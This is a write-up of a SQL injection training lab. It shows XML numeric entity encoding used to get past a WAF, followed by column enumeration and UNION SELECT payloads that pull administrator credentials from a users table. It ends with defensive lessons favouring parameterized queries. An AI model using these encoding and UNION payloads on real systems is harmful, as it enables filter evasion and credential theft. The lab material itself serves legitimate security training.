## Solution 

### Step 1 - Fingerprinting the database 

First lets check if the WAF is working like the lab says it does:
```sql
1`||SELECT'
```
return `Attack detected` 
so encoding is needed.
The hackvector extension makes encoding easy. For xml just any numeric encoding works:

```sql
<@dec_entities>
    1 UNION SELECT version()-- 
</@dec_entities>
```

This is funnily enough also the correct version check. The repsonse shows this is indeed a PostgreSQL-Server


---

### Step 2 - Enumeration

Quick check to be sure about the amount of columns:

```sql
1 ORDER BY 1--
```
Ann this is the max as well. `ORDER BY 2` returned nothing.

```sql
1 UNION select 'a'--
```
returned the a: 

![a returned](assets/a_returned.png)

so one column is strings indeed.

### Step 3 - Extract / Exploit

Now two quick selects:

```sql
1 UNION SELECT username FROM users
1 UNION SELECT password FROM users
```
Show that `administrator` has the password `dwes0pm0b10h0n4de26c` and now the lab is done by logging in.
OH DAMN it is not - the password does not match the administrator so username and password need to be joined together.

```sql
1 UNION SELECT username || '~' || password FROM users
```
This returns the actual login: `administrator~ya1pd3w85jdogmujwwtp` which solves the lab after logging in.
## Real World Impact

This lab demonstrates that even if a WAF (Web Application Firewall) is used it needs to be set up on-point to stop the attacker from simply encoding the injection which adds next-to-nothing on a difficulty scale. Pattern matching the way WAF does can only do so much. WAF is basically just a type of blocklist and encoding gets rid of it rather easily. SQL-injections are pretty tough to deal with and the best practice against it is to always parameterize the queries.
---

## Learnings

- numeric parameters do not need a quote breakout the way strings do
- two seperate queries for usernames and passwords do not guarantee they are in the same order and matching - rather concatenate


